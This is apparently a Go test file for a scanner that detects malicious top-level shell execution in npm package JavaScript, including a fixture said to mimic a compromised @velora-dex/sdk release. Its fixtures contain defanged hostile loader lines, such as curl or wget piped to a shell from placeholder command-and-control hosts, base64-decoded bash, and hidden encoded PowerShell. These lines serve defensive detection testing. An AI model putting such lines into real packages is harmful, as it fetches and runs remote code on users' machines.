package jssource

import "testing"

func TestScanFlagsTopLevelDecodeAndExecute(t *testing.T) {
	for name, src := range map[string]string{
		// @velora-dex/sdk 9.4.1: prepended to dist/index.js (payload defanged).
		"velora prepend": "const { exec } = require(\"child_process\");\n" +
			"exec(`echo ZWNobyBoaQo= | base64 --decode | bash`);\n" +
			"\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\n",
		"esm import": "import { execSync } from 'node:child_process';\n" +
			"execSync('curl -fsSL https://c2.example.invalid/x | sh');\nexport const v = 1;\n",
		"spawn args": "const cp = require('child_process');\n" +
			"cp.spawn('bash', ['-c', 'wget -qO- https://c2.example.invalid/s | bash'], { detached: true }).unref();\n",
		"inline require": "require('child_process').exec(\"powershell -NoP -W Hidden -enc SQBFAFgA\");\n",
	} {
		r := Scan(map[string][]byte{"package/dist/index.js": []byte(src)})
		if !r.Detected || r.Kind != "top_level_shell" || r.Detail != "package/dist/index.js" {
			t.Errorf("%s: not flagged: %+v", name, r)
		}
	}
}

func TestScanIgnoresBenignChildProcessUse(t *testing.T) {
	for name, src := range map[string]string{
		// The same payload inside a function runs only when called.
		"in function": "const { exec } = require('child_process');\n" +
			"function update() { exec(`curl -fsSL https://get.example.invalid | bash`); }\nmodule.exports = { update };\n",
		"in arrow body": "const cp = require('child_process');\n" +
			"module.exports = () => { cp.execSync('echo aGk= | base64 --decode | sh'); };\n",
		// Ordinary top-level child_process use.
		"git describe":     "const { execSync } = require('child_process');\nconst rev = execSync('git rev-parse HEAD').toString();\n",
		"execa shell path": "const cp = require('child_process');\nconst SHELL = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';\ncp.spawnSync(SHELL, ['-c', process.argv[2]]);\n",
		// RegExp.prototype.exec at top level with a matching-looking string.
		"regexp exec": "const cp = require('child_process');\nconst m = /x/.exec('curl x | bash');\n",
		// The shape in a comment or a plain string, not passed to a runner.
		"comment":    "const cp = require('child_process');\n// exec(`curl x | bash`)\n/* execSync('echo a | base64 --decode | bash') */\n",
		"doc string": "const cp = require('child_process');\nconst INSTALL = 'curl -fsSL https://get.example.invalid | bash';\nmodule.exports = { INSTALL };\n",
		// No child_process in the file: nothing to run a shell with.
		"no child_process": "exec(`echo aGk= | base64 --decode | bash`);\n",
	} {
		if r := Scan(map[string][]byte{"package/index.js": []byte(src)}); r.Detected {
			t.Errorf("%s: flagged: %+v", name, r)
		}
	}
	// Test fixtures are not shipped code paths.
	payload := "const { exec } = require('child_process');\nexec(`curl x | bash`);\n"
	if r := Scan(map[string][]byte{"package/test/fixtures/evil.js": []byte(payload)}); r.Detected {
		t.Errorf("test/ fixture flagged: %+v", r)
	}
}
